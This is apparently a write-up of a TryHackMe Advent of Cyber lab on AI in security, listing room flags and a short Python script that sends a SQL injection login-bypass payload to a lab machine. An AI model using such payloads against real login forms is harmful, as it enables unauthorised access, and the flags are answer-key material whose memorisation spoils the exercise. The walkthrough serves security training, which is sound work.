# TryHackMe Advent of Cyber 2025 - Day 4: AI in Security - old sAInt nick

**Room Link:** https://tryhackme.com/room/AIforcyber-aoc2025-y9wWQ1zRgB  
**Difficulty:** Easy  
**Topics:** AI in Offensive Security, Defensive Security, Secure Code Review, SQL Injection  

## Overview
This room explores practical applications of AI in cybersecurity through interaction with "Van SolveIT" – an AI assistant helping red team (offensive), blue team (defensive), and developers.

Key learning points:
- AI accelerates exploit generation and vulnerability identification.
- AI aids log analysis and threat detection.
- AI performs static code review but requires human oversight.
- Risks of over-reliance on AI (e.g., incomplete validation).

## Task Breakdown & Solutions

### Stage 1: Introduction & Red Team (Offensive Security)
- Interact with Van SolveIT in **Red Team mode**.
- Ask it to generate a Python exploit for SQL injection in the login form of the vulnerable web app (hosted on your machine IP:5000).
- Update the generated script with your machine IP.
- Run the script: `python3 exploit.py`
- **Flag from exploit output:** `THM{AI_ASSISTED_EXPLOITATION}`

### Stage 2: Blue Team (Defensive Security)
- Switch to **Blue Team mode**.
- Provide the suspicious log entry from the SQLi attempt.
- AI analyzes it and identifies the attack.
- No separate flag here – progresses the story.

### Stage 3: Developer (Secure Code Review)
- Switch to **Developer mode**.
- Ask AI to review the provided PHP code snippet for vulnerabilities.
- AI identifies issues (e.g., insecure use of null coalescing operator for input handling).
- No separate flag here.

### Final Stage: Completion
- Progress through all stages.
- Van SolveIT presents the room completion flag.
- **Final Flag:** `THM{AI_MANIA}`

## Sample Red Team Exploit Script (Redacted Example)
```python
import requests

TARGET = "http://10.82.170.130:5000/login"  # Replace with your machine IP
PAYLOAD = {"username": "admin' OR '1'='1' -- ", "password": ""}

response = requests.post(TARGET, data=PAYLOAD)
if "Flag" in response.text:
    print("Success! Flag:", response.text)
